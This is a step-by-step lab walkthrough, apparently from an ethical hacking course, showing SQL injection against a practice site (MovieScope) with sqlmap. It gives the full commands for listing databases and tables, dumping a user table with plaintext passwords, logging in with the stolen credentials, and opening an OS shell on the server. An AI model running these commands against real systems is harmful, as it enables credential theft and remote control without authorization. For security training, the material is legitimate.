sql ---------------------
A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.
In the [sudo] password for attacker field, type toor as a password and press Enter.
Note: The password that you type will not be visible.


dbms databases ---------

In the Parrot Terminal window, type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs and press Enter.
Note: In this query, -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.
The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the MovieScope website.



If the message Do you want to skip test payloads specific for other DBMSes? [Y/n] appears, type Y and press Enter.
If the message for the remaining tests, do you want to include all tests for ‘Microsoft SQL Server’ extending provided level (1) and risk (1) values? [Y/n] appears, type Y and press Enter.
Similarly, if any other message appears, type Y and press Enter to continue.



sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, as shown in the screenshot.


dbms tables ----------
Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with the database moviescope.
Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables and press Enter.
Note: In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
The above query causes sqlmap to scan the moviescope database for tables located in the database.
sqlmap retrieves the table contents of the moviescope database and displays them, as shown in screenshot.

login--------------

Now, you need to retrieve the table content of the column User_Login.
Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump and press Enter to dump all the User_Login table content.
sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users’ usernames under the Uname column and passwords under the password column, as shown in screenshot.You will see that under the password column, the passwords are shown in plain text form.


verify ---------------
To verify if the login details are valid, you should try to log in with the extracted login details of any of the users. To do so, switch back to the web browser, close the Developer Tools console, and click Logout to start a new session on the site.
The Login page appears; log in into the website using the retrieved credentials john/qwerty.
Note: If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save.
You will observe that you have successfully logged into the MovieScope website with john’s account, as shown in the screenshot.

os --------------------

Now, switch back to the Parrot Terminal window. Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell and press Enter.
Note: In this query, --os-shell is the prompt for an interactive OS shell.
If the message do you want sqlmap to try to optimize value(s) for DBMS delay responses appears, type Y and press Enter to continue.
Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running.
If the message do you want to retrieve the command standard output? appears, type Y and press Enter.


sqlmap will retrieve the hostname of the machine on which the target web application is running, as shown in the screenshot.


Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system.



If the message do you want to retrieve the command standard output? appears, type Y and press Enter.

The above command retrieves the tasks and displays them under the command standard output section, as shown in the screenshots below.



Following the same process, you can use various other commands to obtain further detailed information about the target machine.

To view the available commands under the OS shell, type help and press Enter.



This concludes the demonstration of how to launch a SQL injection attack against MSSQL to extract databases using sqlmap.

Close all open windows and document all the acquired information.

You can also use other SQL injection tools such as Mole (https://sourceforge.net), Blisqy (https://github.com), blind-sql-bitshifting (https://github.com), and NoSQLMap (https://github.com) to perform SQL injection attacks.
